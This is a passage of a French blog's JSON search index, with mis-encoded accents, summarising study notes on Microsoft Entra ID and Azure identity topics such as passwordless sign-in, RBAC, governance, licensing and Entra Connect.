utilisateur simplifi√©e tout en acc√©dant aux applications web d‚Äôune organisation.\u003c/p\u003e","title":""},{"content":"Chaque organisation a des besoins diff√©rents en mati√®re d\u0026rsquo;authentification. Microsoft Azure et Azure Government proposent les quatre options d\u0026rsquo;authentification sans mot de passe suivantes, compatibles avec Microsoft Entra ID¬†:\nWindows Hello Entreprise Microsoft Authenticator Cl√©s d\u0026rsquo;acc√®s FIDO2 (Fast IDentity Online 2) Authentification bas√©e sur un certificat Windows Hello Entreprise Windows Hello Entreprise est id√©al pour les professionnels de l\u0026rsquo;information disposant de leur propre PC Windows. Les identifiants biom√©triques et le code PIN sont directement li√©s au PC de l\u0026rsquo;utilisateur, emp√™chant ainsi tout acc√®s autre que celui du propri√©taire. Gr√¢ce √† l\u0026rsquo;int√©gration de l\u0026rsquo;infrastructure √† cl√©s publiques (PKI) et √† la prise en charge int√©gr√©e de l\u0026rsquo;authentification unique (SSO), Windows Hello Entreprise offre un moyen pratique d\u0026rsquo;acc√©der facilement aux ressources de l\u0026rsquo;entreprise, sur site et dans le cloud.\nMicrosoft Authenticator Vous pouvez √©galement autoriser le t√©l√©phone de votre employ√© √† utiliser une m√©thode d\u0026rsquo;authentification sans mot de passe. Vous utilisez peut-√™tre d√©j√† l\u0026rsquo;application Authenticator comme option d\u0026rsquo;authentification multifacteur pratique, en compl√©ment d\u0026rsquo;un mot de passe. Vous pouvez √©galement utiliser l\u0026rsquo;application Authenticator comme option sans mot de passe.\nCl√©s d\u0026rsquo;acc√®s (FIDO2) L\u0026rsquo;Alliance FIDO (Fast IDentity Online) contribue √† promouvoir des normes d\u0026rsquo;authentification ouvertes et √† r√©duire l\u0026rsquo;utilisation des mots de passe comme moyen d\u0026rsquo;authentification. FIDO2 est la derni√®re norme int√©grant la norme d\u0026rsquo;authentification Web (WebAuthn).\nAuthentification bas√©e sur un certificat ","permalink":"https://nyobemichel.me/posts/azure/authentification-sans-mot-de-passe-pour-microsoft-entra-id/","summary":"\u003cp\u003eChaque organisation a des besoins diff√©rents en mati√®re d\u0026rsquo;authentification. Microsoft Azure et Azure Government proposent les quatre options d\u0026rsquo;authentification sans mot de passe suivantes, compatibles avec Microsoft Entra ID¬†:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eWindows Hello Entreprise\u003c/li\u003e\n\u003cli\u003eMicrosoft Authenticator\u003c/li\u003e\n\u003cli\u003eCl√©s d\u0026rsquo;acc√®s FIDO2 (Fast IDentity Online 2)\u003c/li\u003e\n\u003cli\u003eAuthentification bas√©e sur un certificat\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"windows-hello-entreprise\"\u003eWindows Hello Entreprise\u003c/h2\u003e\n\u003cp\u003eWindows Hello Entreprise est id√©al pour les professionnels de l\u0026rsquo;information disposant de leur propre PC Windows. Les identifiants biom√©triques et le code PIN sont directement li√©s au PC de l\u0026rsquo;utilisateur, emp√™chant ainsi tout acc√®s autre que celui du propri√©taire. Gr√¢ce √† l\u0026rsquo;int√©gration de l\u0026rsquo;infrastructure √† cl√©s publiques (PKI) et √† la prise en charge int√©gr√©e de l\u0026rsquo;authentification unique (SSO), Windows Hello Entreprise offre un moyen pratique d\u0026rsquo;acc√©der facilement aux ressources de l\u0026rsquo;entreprise, sur site et dans le cloud.\u003c/p\u003e","title":""},{"content":"Le contr√¥le d\u0026rsquo;acc√®s aux ressources avec Azure RBAC consiste √† attribuer des r√¥les Azure. Il s\u0026rsquo;agit d\u0026rsquo;un concept essentiel √† comprendre¬†: c\u0026rsquo;est ainsi que les autorisations sont appliqu√©es. L\u0026rsquo;attribution d\u0026rsquo;un r√¥le se compose de trois √©l√©ments¬†: le principal de s√©curit√©, la d√©finition du r√¥le et l\u0026rsquo;√©tendue.\nUne d√©finition de r√¥le est un ensemble d\u0026rsquo;autorisations. On l\u0026rsquo;appelle g√©n√©ralement simplement un r√¥le. Une d√©finition de r√¥le r√©pertorie les actions pouvant √™tre effectu√©es, telles que la lecture, l\u0026rsquo;√©criture et la suppression. Les r√¥les peuvent √™tre de haut niveau, comme celui de propri√©taire, ou sp√©cifiques, comme celui de lecteur de machine virtuelle.\nComment Azure RBAC d√©termine si un utilisateur a acc√®s √† une ressource Voici les √©tapes g√©n√©rales utilis√©es par Azure RBAC pour d√©terminer si vous avez acc√®s √† une ressource. Ces √©tapes s\u0026rsquo;appliquent √† Azure Resource Manager ou aux services de plan de donn√©es int√©gr√©s √† Azure RBAC. Elles sont utiles pour r√©soudre un probl√®me d\u0026rsquo;acc√®s.\nUn utilisateur (ou principal de service) acquiert un jeton pour Azure Resource Manager. Ce jeton inclut les appartenances aux groupes de l\u0026rsquo;utilisateur (y compris les appartenances aux groupes transitifs). L‚Äôutilisateur effectue un appel d‚ÄôAPI REST vers Azure Resource Manager avec le jeton attach√©. Azure Resource Manager r√©cup√®re toutes les attributions de r√¥les et refuse les attributions qui s‚Äôappliquent √† la ressource sur laquelle l‚Äôaction est effectu√©e. Si une affectation refus√©e s\u0026rsquo;applique, l\u0026rsquo;acc√®s est bloqu√©. Sinon, l\u0026rsquo;√©valuation se poursuit. Azure Resource Manager restreint les attributions de r√¥les qui s‚Äôappliquent √† cet utilisateur ou √† son groupe et d√©termine les r√¥les dont dispose l‚Äôutilisateur pour cette ressource. Azure Resource Manager d√©termine si l\u0026rsquo;action de l\u0026rsquo;appel d\u0026rsquo;API est incluse dans les r√¥les de l\u0026rsquo;utilisateur pour cette ressource. Si les r√¥les incluent¬†Actionsun caract√®re g√©n√©rique (¬†*), les autorisations effectives sont calcul√©es en soustrayant le¬†NotActionsde la valeur autoris√©e¬†Actions. De m√™me, la m√™me soustraction est effectu√©e pour toutes les actions de donn√©es. Actions - NotActions = Effective management permissions DataActions - NotDataActions = Effective data permissions Si l\u0026rsquo;utilisateur ne dispose pas d\u0026rsquo;un r√¥le pour l\u0026rsquo;action correspondant √† la port√©e demand√©e, l\u0026rsquo;acc√®s n\u0026rsquo;est pas autoris√©. Dans le cas contraire, toutes les conditions sont √©valu√©es. Si l\u0026rsquo;attribution de r√¥le comprend des conditions, celles-ci sont √©valu√©es. Sinon, l\u0026rsquo;acc√®s est autoris√©. Si les conditions sont remplies, l\u0026rsquo;acc√®s est autoris√©. Sinon, l\u0026rsquo;acc√®s est refus√©. ","permalink":"https://nyobemichel.me/posts/azure/azure-rbac/","summary":"\u003cp\u003eLe contr√¥le d\u0026rsquo;acc√®s aux ressources avec Azure RBAC consiste √† attribuer des r√¥les Azure. Il s\u0026rsquo;agit d\u0026rsquo;un concept essentiel √† comprendre¬†: c\u0026rsquo;est ainsi que les autorisations sont appliqu√©es. L\u0026rsquo;attribution d\u0026rsquo;un r√¥le se compose de trois √©l√©ments¬†: le principal de s√©curit√©, la d√©finition du r√¥le et l\u0026rsquo;√©tendue.\u003c/p\u003e\n\u003cp\u003eUne d√©finition de r√¥le est un ensemble d\u0026rsquo;autorisations. On l\u0026rsquo;appelle g√©n√©ralement simplement un r√¥le. Une d√©finition de r√¥le r√©pertorie les actions pouvant √™tre effectu√©es, telles que la lecture, l\u0026rsquo;√©criture et la suppression. Les r√¥les peuvent √™tre de haut niveau, comme celui de propri√©taire, ou sp√©cifiques, comme celui de lecteur de machine virtuelle.\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/azure/enumeration---azure/","summary":"","title":""},{"content":"Microsoft Entra ID Governance est une solution de gouvernance des identit√©s qui permet aux organisations d\u0026rsquo;am√©liorer leur productivit√©, de renforcer leur s√©curit√© et de se conformer plus facilement aux exigences r√©glementaires et de conformit√©. Microsoft Entra ID Governance vous permet de garantir automatiquement l\u0026rsquo;acc√®s des bonnes personnes aux bonnes ressources gr√¢ce √† l\u0026rsquo;automatisation des processus d\u0026rsquo;identit√© et d\u0026rsquo;acc√®s, √† la d√©l√©gation aux groupes d\u0026rsquo;entreprise et √† une visibilit√© accrue.\nCycle de vie de l\u0026rsquo;identit√© Dans Microsoft Entra ID Governance, vous pouvez automatiser le cycle de vie de l\u0026rsquo;identit√© de ces personnes en utilisant¬†:\nProvisionnement entrant √† partir des sources RH de votre organisation, y compris la r√©cup√©ration √† partir de Workday et SuccessFactors, pour maintenir automatiquement les identit√©s des utilisateurs dans Active Directory et Microsoft Entra ID. Workflows de cycle de vie pour automatiser les t√¢ches ex√©cut√©es lors d\u0026rsquo;√©v√©nements cl√©s, comme avant l\u0026rsquo;arriv√©e d\u0026rsquo;un nouvel employ√©, lors de son changement de statut et lors de son d√©part. Par exemple, un workflow peut √™tre configur√© pour envoyer un e-mail contenant un code d\u0026rsquo;acc√®s temporaire au responsable d\u0026rsquo;un nouvel utilisateur, ou un e-mail de bienvenue √† l\u0026rsquo;utilisateur d√®s son premier jour. Strat√©gies d\u0026rsquo;attribution automatique dans la gestion des droits pour ajouter et supprimer les appartenances aux groupes, les r√¥les d\u0026rsquo;application et les r√¥les de site SharePoint d\u0026rsquo;un utilisateur, en fonction des modifications apport√©es aux attributs de l\u0026rsquo;utilisateur. Provisionnement d\u0026rsquo;utilisateurs pour cr√©er, mettre √† jour et supprimer des comptes d\u0026rsquo;utilisateurs dans d\u0026rsquo;autres applications, avec des connecteurs vers des centaines d\u0026rsquo;applications cloud et sur site via le syst√®me de gestion des identit√©s interdomaines (SCIM), le protocole d\u0026rsquo;acc√®s aux annuaires l√©gers (LDAP) et le langage de requ√™te structur√© (SQL). Gestion des droits La gestion des droits est une fonctionnalit√© de gouvernance des identit√©s qui permet aux organisations de g√©rer le cycle de vie des identit√©s et des acc√®s √† grande √©chelle, en automatisant les flux de travail des demandes d\u0026rsquo;acc√®s, les attributions d\u0026rsquo;acc√®s, les r√©visions et l\u0026rsquo;expiration.\nCycle de vie de l\u0026rsquo;acc√®s Les organisations ont besoin d\u0026rsquo;un processus pour g√©rer les acc√®s au-del√† de ce qui a √©t√© initialement pr√©vu pour un utilisateur lors de la cr√©ation de son identit√©.\nCycle de vie des acc√®s privil√©gi√©s La gestion des acc√®s privil√©gi√©s est un √©l√©ment cl√© de la gouvernance moderne des identit√©s, notamment compte tenu du risque d\u0026rsquo;abus associ√© aux droits d\u0026rsquo;administrateur pour une organisation. Les employ√©s, fournisseurs et sous-traitants qui s\u0026rsquo;octroient des droits d\u0026rsquo;administrateur doivent voir leurs comptes et leurs droits d\u0026rsquo;acc√®s privil√©gi√©s g√©r√©s.\n","permalink":"https://nyobemichel.me/posts/azure/gouvernance-de-microsoft-entra-id/","summary":"\u003cp\u003eMicrosoft Entra ID Governance est une solution de gouvernance des identit√©s qui permet aux organisations d\u0026rsquo;am√©liorer leur productivit√©, de renforcer leur s√©curit√© et de se conformer plus facilement aux exigences r√©glementaires et de conformit√©. Microsoft Entra ID Governance vous permet de garantir automatiquement l\u0026rsquo;acc√®s des bonnes personnes aux bonnes ressources gr√¢ce √† l\u0026rsquo;automatisation des processus d\u0026rsquo;identit√© et d\u0026rsquo;acc√®s, √† la d√©l√©gation aux groupes d\u0026rsquo;entreprise et √† une visibilit√© accrue.\u003c/p\u003e\n\u003ch2 id=\"cycle-de-vie-de-lidentit√©\"\u003eCycle de vie de l\u0026rsquo;identit√©\u003c/h2\u003e\n\u003cp\u003eDans Microsoft Entra ID Governance, vous pouvez automatiser le cycle de vie de l\u0026rsquo;identit√© de ces personnes en utilisant¬†:\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/azure/identit%C3%A9-et-acc%C3%A8s-s%C3%A9curis%C3%A9s/","summary":"","title":""},{"content":"Objectifs d\u0026rsquo;apprentissage Dans ce module, vous :\nCr√©er, configurer et g√©rer les utilisateurs Cr√©er, configurer et g√©rer des groupes G√©rer les licences Explorez les attributs de s√©curit√© personnalis√©s et le provisionnement automatique Afficher les utilisateurs Pour afficher les utilisateurs Microsoft Entra, s√©lectionnez l\u0026rsquo;¬†entr√©e¬†¬´¬†Utilisateurs¬†¬ª sous¬†¬´¬†Identit√©¬†¬ª, puis ouvrez la vue¬†¬´¬†Tous les utilisateurs¬†¬ª¬†. Prenez quelques instants pour acc√©der au portail et consulter vos utilisateurs. Observez la colonne¬†¬´¬†Type d\u0026rsquo;utilisateur¬†¬ª¬†pour afficher les membres et les invit√©s. En r√®gle g√©n√©rale, Microsoft Entra ID d√©finit les utilisateurs de trois mani√®res¬†:\nIdentit√©s cloud¬†: ces utilisateurs existent uniquement dans Microsoft Entra ID. Il peut s\u0026rsquo;agir de comptes administrateurs ou d\u0026rsquo;utilisateurs que vous g√©rez vous-m√™me. Leur source est¬†Microsoft Entra ID¬†ou¬†un annuaire Microsoft Entra externe¬†si l\u0026rsquo;utilisateur est d√©fini dans une autre instance Microsoft Entra mais a besoin d\u0026rsquo;acc√©der aux ressources d\u0026rsquo;abonnement contr√¥l√©es par cet annuaire. Lorsque ces comptes sont supprim√©s de l\u0026rsquo;annuaire principal, ils sont supprim√©s. Identit√©s synchronis√©es avec l\u0026rsquo;annuaire¬†: ces utilisateurs sont pr√©sents dans un annuaire Active Directory local. Une synchronisation via¬†Microsoft Entra Connect¬†permet d\u0026rsquo;int√©grer ces utilisateurs √† Azure. Leur source est¬†Windows Server AD¬†. Utilisateurs invit√©s¬†: ces utilisateurs existent en dehors d\u0026rsquo;Azure. Il peut s\u0026rsquo;agir de comptes d\u0026rsquo;autres fournisseurs cloud ou de comptes Microsoft, comme un compte Xbox LIVE. Leur source est¬†¬´¬†Utilisateur invit√©¬†¬ª¬†. Ce type de compte est utile lorsque des fournisseurs ou sous-traitants externes ont besoin d\u0026rsquo;acc√©der √† vos ressources Azure. Une fois leur intervention termin√©e, vous pouvez supprimer le compte et tous leurs acc√®s. Cr√©er un nouvel utilisateur dans Microsoft Entra ID Acc√©dez au menu Identit√© dans le¬†centre d‚Äôadministration Microsoft Entra¬†. Dans la navigation de gauche, s√©lectionnez¬†Utilisateurs¬†, puis¬†Tous les utilisateurs. Dans la page Utilisateurs, dans le menu, s√©lectionnez +¬†Nouvel utilisateur¬†et¬†Cr√©er un nouvel utilisateur¬†. Cr√©er un groupe de s√©curit√© dans Microsoft Entra ID Acc√©dez √† l‚Äô√©cran du centre d‚Äôadministration Microsoft Entra. Dans la navigation de gauche, sous¬†Identit√©¬†, s√©lectionnez¬†Groupes¬†puis¬†Tous les groupes¬†. Dans l‚Äô√©cran Groupes, dans le menu, s√©lectionnez¬†Nouveau groupe¬†. Attribuer une licence √† un groupe Dans la liste¬†Tous les groupes¬†, s√©lectionnez¬†Marketing¬†. Dans la fen√™tre Marketing, sous¬†G√©rer¬†, s√©lectionnez¬†Licences¬†. Notez qu\u0026rsquo;aucune licence n\u0026rsquo;est actuellement attribu√©e √† ce groupe. Ouvrez un nouvel onglet dans votre navigateur. Acc√©dez au centre d‚Äôadministration Microsoft 365 √† l‚Äô¬†adresse http://admin.microsoft.com¬†. S√©lectionnez¬†Facturation¬†dans le menu de gauche. S√©lectionnez¬†Licences¬†. Dans la liste des licences dont vous disposez, s√©lectionnez-en une. Ensuite, vous s√©lectionnez¬†Groupes¬†dans la liste en haut de l‚Äô√©cran. Sur la page Groupes, s√©lectionnez +¬†Attribuer une licence¬†. Recherchez et s√©lectionnez le groupe¬†Marketing¬†que nous avons cr√©√© pr√©c√©demment. S√©lectionnez le bouton¬†Attribuer¬†en bas de la bo√Æte de dialogue. Vous devriez recevoir un message indiquant que les licences ont √©t√© attribu√©es avec succ√®s. Cr√©er, configurer et g√©rer des groupes Un groupe Microsoft Entra permet d\u0026rsquo;organiser les utilisateurs, ce qui simplifie la gestion des autorisations. L\u0026rsquo;utilisation de groupes permet au propri√©taire de la ressource (ou du r√©pertoire Microsoft Entra) d\u0026rsquo;attribuer un ensemble d\u0026rsquo;autorisations d\u0026rsquo;acc√®s √† tous les membres du groupe, au lieu de devoir attribuer les droits un par un. Microsoft Entra ID vous permet de d√©finir deux types de groupes diff√©rents.\nLes groupes de s√©curit√©¬†sont les plus courants et permettent de g√©rer l\u0026rsquo;acc√®s des membres et des ordinateurs aux ressources partag√©es d\u0026rsquo;un groupe d\u0026rsquo;utilisateurs. Par exemple, vous pouvez cr√©er un groupe de s√©curit√© pour une strat√©gie de s√©curit√© sp√©cifique. Ainsi, vous pouvez attribuer un ensemble d\u0026rsquo;autorisations √† tous les membres simultan√©ment, au lieu de les attribuer individuellement √† chaque membre. Cette option n√©cessite un administrateur Microsoft Entra. Groupes Microsoft 365¬†: offrez des opportunit√©s de collaboration en donnant aux membres l\u0026rsquo;acc√®s √† une bo√Æte aux lettres, un calendrier, des fichiers, un site SharePoint partag√©s, etc. Cette option vous permet √©galement d\u0026rsquo;autoriser des personnes ext√©rieures √† votre organisation √† acc√©der au groupe. Cette option est disponible pour les utilisateurs comme pour les administrateurs. Cr√©er un groupe Microsoft 365 dans Microsoft Entra ID Acc√©dez √† la page Identit√© du centre d‚Äôadministration Microsoft Entra dans le¬†centre d‚Äôadministration Microsoft Entra¬†. Dans la navigation de gauche, sous s√©lectionnez¬†Groupes¬†. Dans la lame Groupes, dans le menu, s√©lectionnez¬†Nouveau groupe¬†. Cr√©ez un groupe en utilisant les informations suivantes¬†: Modifier l\u0026rsquo;attribution de licence de groupe Ouvrez¬†https://entra.microsoft.com¬†pour acc√©der au centre d‚Äôadministration Microsoft Entra. Dans la navigation de gauche, ouvrez¬†Groupes¬†. S√©lectionnez¬†Tous les groupes¬†, puis s√©lectionnez l‚Äôun des groupes disponibles. Dans la navigation de gauche, sous¬†G√©rer¬†, s√©lectionnez¬†Licences¬†. Vous verrez la liste des licences actuellement attribu√©es. Vous devrez utiliser le Centre d\u0026rsquo;administration Microsoft 365 pour effectuer les mises √† jour.\nPassez en revue les t√¢ches en cours, puis, dans le menu, s√©lectionnez¬†+ T√¢ches¬†. Ouvrez¬†https://admin.microsoft.com¬†pour ouvrir le centre d‚Äôadministration Microsoft 365. S√©lectionnez¬†Facturation¬†. S√©lectionnez ensuite¬†Licences¬†. S√©lectionnez une licence disponible dans la liste. S√©lectionnez¬†Groupes¬†dans le menu en haut de la page. S√©lectionnez l‚Äô¬†option¬†+ Attribuer des licences . S√©lectionnez le groupe que vous consultiez pr√©c√©demment dans Microsoft Entra. S√©lectionnez ensuite le bouton¬†¬´¬†Attribuer¬†¬ª¬†en bas de la page. Sur la page ¬´¬†Licences¬†¬ª du groupe, v√©rifiez la modification. Vous devriez la voir dans le centre d\u0026rsquo;administration Microsoft Entra et dans le centre d\u0026rsquo;administration Microsoft 365. Mettre √† jour les attributions de licences utilisateur Acc√©dez au centre d‚Äôadministration Microsoft Entra. Dans la navigation de gauche, sous¬†Identit√©¬†, s√©lectionnez¬†Utilisateurs¬†. Dans l‚Äô√©cran Utilisateurs, s√©lectionnez¬†Dominique Koch¬†. Dans la navigation de gauche, s√©lectionnez¬†Licences. Dans le panneau Mettre √† jour les attributions de licence, cochez la case correspondant √† une ou plusieurs licences. Qu\u0026rsquo;est-ce qu\u0026rsquo;un attribut de s√©curit√© personnalis√©¬†? Les attributs de s√©curit√© personnalis√©s de Microsoft Entra ID sont des attributs m√©tier (paires cl√©-valeur) que vous pouvez d√©finir et affecter aux objets Microsoft Entra. Ces attributs permettent de stocker des informations, de cat√©goriser des objets ou d\u0026rsquo;appliquer un contr√¥le d\u0026rsquo;acc√®s pr√©cis √† des ressources Azure sp√©cifiques.\n","permalink":"https://nyobemichel.me/posts/azure/identit%C3%A9s-et-lacc%C3%A8s-avec-microsoft-entra/","summary":"\u003ch2 id=\"objectifs-dapprentissage\"\u003eObjectifs d\u0026rsquo;apprentissage\u003c/h2\u003e\n\u003cp\u003eDans ce module, vous :\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCr√©er, configurer et g√©rer les utilisateurs\u003c/li\u003e\n\u003cli\u003eCr√©er, configurer et g√©rer des groupes\u003c/li\u003e\n\u003cli\u003eG√©rer les licences\u003c/li\u003e\n\u003cli\u003eExplorez les attributs de s√©curit√© personnalis√©s et le provisionnement automatique\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"afficher-les-utilisateurs\"\u003eAfficher les utilisateurs\u003c/h2\u003e\n\u003cp\u003ePour afficher les utilisateurs Microsoft Entra, s√©lectionnez l\u0026rsquo;¬†entr√©e¬†\u003cstrong\u003e¬´¬†Utilisateurs¬†¬ª sous\u003c/strong\u003e¬†\u003cstrong\u003e¬´¬†Identit√©\u003c/strong\u003e¬†¬ª, puis ouvrez la vue¬†\u003cstrong\u003e¬´¬†Tous les utilisateurs¬†¬ª\u003c/strong\u003e¬†. Prenez quelques instants pour acc√©der au portail et consulter vos utilisateurs. Observez la colonne¬†\u003cstrong\u003e¬´¬†Type d\u0026rsquo;utilisateur¬†¬ª\u003c/strong\u003e¬†pour afficher les membres et les invit√©s.\nEn r√®gle g√©n√©rale, Microsoft Entra ID d√©finit les utilisateurs de trois mani√®res¬†:\u003c/p\u003e","title":""},{"content":"L\u0026rsquo;authentification multifacteur est un processus qui demande √† l\u0026rsquo;utilisateur des √©l√©ments d\u0026rsquo;identification suppl√©mentaires lors de la connexion. Par exemple, il peut √™tre invit√© √† saisir un code sur son t√©l√©phone portable ou √† fournir une empreinte digitale.\n","permalink":"https://nyobemichel.me/posts/azure/implement-multifactor-authentication-mfa/","summary":"\u003cp\u003eL\u0026rsquo;authentification multifacteur est un processus qui demande √† l\u0026rsquo;utilisateur des √©l√©ments d\u0026rsquo;identification suppl√©mentaires lors de la connexion. Par exemple, il peut √™tre invit√© √† saisir un code sur son t√©l√©phone portable ou √† fournir une empreinte digitale.\u003c/p\u003e","title":""},{"content":"Synchronisation du hachage de mot de passe avec Microsoft Entra ID La synchronisation du hachage du mot de passe est l\u0026rsquo;une des m√©thodes de connexion utilis√©es pour obtenir une identit√© hybride. Microsoft Entra Connect synchronise le hachage du mot de passe d\u0026rsquo;un utilisateur depuis une instance Active Directory locale vers une instance Microsoft Entra cloud.\n","permalink":"https://nyobemichel.me/posts/azure/methode-de-connexion-azure/","summary":"\u003ch1 id=\"synchronisation-du-hachage-de-mot-de-passe-avec-microsoft-entra-id\"\u003eSynchronisation du hachage de mot de passe avec Microsoft Entra ID\u003c/h1\u003e\n\u003cp\u003eLa synchronisation du hachage du mot de passe est l\u0026rsquo;une des m√©thodes de connexion utilis√©es pour obtenir une identit√© hybride. Microsoft Entra Connect synchronise le hachage du mot de passe d\u0026rsquo;un utilisateur depuis une instance Active Directory locale vers une instance Microsoft Entra cloud.\u003c/p\u003e","title":""},{"content":"Microsoft Entra Cloud Sync est une nouvelle offre Microsoft con√ßue pour r√©pondre √† vos besoins en mati√®re d\u0026rsquo;identit√© hybride et synchroniser vos utilisateurs, groupes et contacts avec Microsoft Entra ID. Pour ce faire, elle utilise l\u0026rsquo;agent de provisionnement cloud Microsoft Entra au lieu de l\u0026rsquo;application Microsoft Entra Connect. Elle peut toutefois √™tre utilis√©e conjointement avec Microsoft Entra Connect Sync et offre les avantages suivants¬†:\nPrise en charge de la synchronisation avec un locataire Microsoft Entra √† partir d\u0026rsquo;un environnement de for√™t Active Directory d√©connect√© multi-for√™ts¬†: les sc√©narios courants incluent la fusion et l\u0026rsquo;acquisition (o√π les for√™ts AD de la soci√©t√© acquise sont isol√©es des for√™ts AD de la soci√©t√© m√®re) et les soci√©t√©s qui ont historiquement eu plusieurs for√™ts AD. Installation simplifi√©e avec des agents de provisionnement l√©gers : les agents agissent comme un pont entre AD et Microsoft Entra ID, avec toute la configuration de synchronisation g√©r√©e dans le cloud. Plusieurs agents de provisionnement peuvent √™tre utilis√©s pour simplifier les d√©ploiements √† haute disponibilit√©, particuli√®rement critiques pour les organisations qui s\u0026rsquo;appuient sur la synchronisation du hachage de mot de passe d\u0026rsquo;AD vers Microsoft Entra ID. Prise en charge des grands groupes jusqu\u0026rsquo;√† 50¬†000 membres. Il est recommand√© d\u0026rsquo;utiliser uniquement le filtre de port√©e de l\u0026rsquo;unit√© organisationnelle (UO) lors de la synchronisation de grands groupes. ","permalink":"https://nyobemichel.me/posts/azure/microsoft-entra-cloud-sync/","summary":"\u003cp\u003eMicrosoft Entra Cloud Sync est une nouvelle offre Microsoft con√ßue pour r√©pondre √† vos besoins en mati√®re d\u0026rsquo;identit√© hybride et synchroniser vos utilisateurs, groupes et contacts avec Microsoft Entra ID. Pour ce faire, elle utilise l\u0026rsquo;agent de provisionnement cloud Microsoft Entra au lieu de l\u0026rsquo;application Microsoft Entra Connect. Elle peut toutefois √™tre utilis√©e conjointement avec Microsoft Entra Connect Sync et offre les avantages suivants¬†:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ePrise en charge de la synchronisation avec un locataire Microsoft Entra √† partir d\u0026rsquo;un environnement de for√™t Active Directory d√©connect√© multi-for√™ts¬†: les sc√©narios courants incluent la fusion et l\u0026rsquo;acquisition (o√π les for√™ts AD de la soci√©t√© acquise sont isol√©es des for√™ts AD de la soci√©t√© m√®re) et les soci√©t√©s qui ont historiquement eu plusieurs for√™ts AD.\u003c/li\u003e\n\u003cli\u003eInstallation simplifi√©e avec des agents de provisionnement l√©gers : les agents agissent comme un pont entre AD et Microsoft Entra ID, avec toute la configuration de synchronisation g√©r√©e dans le cloud.\u003c/li\u003e\n\u003cli\u003ePlusieurs agents de provisionnement peuvent √™tre utilis√©s pour simplifier les d√©ploiements √† haute disponibilit√©, particuli√®rement critiques pour les organisations qui s\u0026rsquo;appuient sur la synchronisation du hachage de mot de passe d\u0026rsquo;AD vers Microsoft Entra ID.\u003c/li\u003e\n\u003cli\u003ePrise en charge des grands groupes jusqu\u0026rsquo;√† 50¬†000 membres. Il est recommand√© d\u0026rsquo;utiliser uniquement le filtre de port√©e de l\u0026rsquo;unit√© organisationnelle (UO) lors de la synchronisation de grands groupes.\u003c/li\u003e\n\u003c/ul\u003e","title":""},{"content":"Microsoft Entra Connect est une application Microsoft sur site con√ßue pour r√©pondre √† vos objectifs d‚Äôidentit√© hybride.\nFonctionnalit√©s de Microsoft Entra Connect Synchronisation du hachage du mot de passe - Une m√©thode de connexion qui synchronise un hachage du mot de passe AD local d\u0026rsquo;un utilisateur avec l\u0026rsquo;ID Microsoft Entra. Authentification directe: une m√©thode de connexion qui permet aux utilisateurs d\u0026rsquo;utiliser le m√™me mot de passe sur site et dans le cloud, mais ne n√©cessite pas l\u0026rsquo;infrastructure suppl√©mentaire d\u0026rsquo;un environnement f√©d√©r√©. Int√©gration de f√©d√©ration : la f√©d√©ration est une option de Microsoft Entra Connect et permet de configurer un environnement hybride √† l\u0026rsquo;aide d\u0026rsquo;une infrastructure AD FS locale. Elle offre √©galement des fonctionnalit√©s de gestion AD FS, telles que le renouvellement des certificats et le d√©ploiement de serveurs AD FS suppl√©mentaires. Synchronisation : cr√©ation des utilisateurs, des groupes et d\u0026rsquo;autres objets. V√©rification de la correspondance des informations d\u0026rsquo;identit√© de vos utilisateurs et groupes locaux avec celles du cloud. Cette synchronisation inclut √©galement les hachages de mots de passe. Surveillance de la sant√© - Microsoft Entra Connect Health peut fournir une surveillance robuste et fournir un emplacement central dans le centre d\u0026rsquo;administration Microsoft Entra pour afficher cette activit√©. Microsoft Entra Connect Health assure une surveillance robuste de votre infrastructure d\u0026rsquo;identit√© sur site. Il vous permet de maintenir une connexion fiable √† Microsoft 365 et √† Microsoft Online Services. Cette fiabilit√© est assur√©e par des fonctionnalit√©s de surveillance de vos principaux composants d\u0026rsquo;identit√©. De plus, les donn√©es cl√©s relatives √† ces composants sont facilement accessibles. ","permalink":"https://nyobemichel.me/posts/azure/microsoft-entra-connect/","summary":"\u003cp\u003eMicrosoft Entra Connect est une application Microsoft sur site con√ßue pour r√©pondre √† vos objectifs d‚Äôidentit√© hybride.\u003c/p\u003e\n\u003ch2 id=\"fonctionnalit√©s-de-microsoft-entra-connect\"\u003eFonctionnalit√©s de Microsoft Entra Connect\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSynchronisation du hachage du mot de passe\u003c/strong\u003e - Une m√©thode de connexion qui synchronise un hachage du mot de passe AD local d\u0026rsquo;un utilisateur avec l\u0026rsquo;ID Microsoft Entra.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAuthentification directe\u003c/strong\u003e: une m√©thode de connexion qui permet aux utilisateurs d\u0026rsquo;utiliser le m√™me mot de passe sur site et dans le cloud, mais ne n√©cessite pas l\u0026rsquo;infrastructure suppl√©mentaire d\u0026rsquo;un environnement f√©d√©r√©.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eInt√©gration de f√©d√©ration\u003c/strong\u003e : la f√©d√©ration est une option de Microsoft Entra Connect et permet de configurer un environnement hybride √† l\u0026rsquo;aide d\u0026rsquo;une infrastructure AD FS locale. Elle offre √©galement des fonctionnalit√©s de gestion AD FS, telles que le renouvellement des certificats et le d√©ploiement de serveurs AD FS suppl√©mentaires.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSynchronisation\u003c/strong\u003e : cr√©ation des utilisateurs, des groupes et d\u0026rsquo;autres objets. V√©rification de la correspondance des informations d\u0026rsquo;identit√© de vos utilisateurs et groupes locaux avec celles du cloud. Cette synchronisation inclut √©galement les hachages de mots de passe.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSurveillance de la sant√©\u003c/strong\u003e - Microsoft Entra Connect Health peut fournir une surveillance robuste et fournir un emplacement central dans le centre d\u0026rsquo;administration Microsoft Entra pour afficher cette activit√©.\nMicrosoft Entra Connect Health assure une surveillance robuste de votre infrastructure d\u0026rsquo;identit√© sur site. Il vous permet de maintenir une connexion fiable √† Microsoft 365 et √† Microsoft Online Services. Cette fiabilit√© est assur√©e par des fonctionnalit√©s de surveillance de vos principaux composants d\u0026rsquo;identit√©. De plus, les donn√©es cl√©s relatives √† ces composants sont facilement 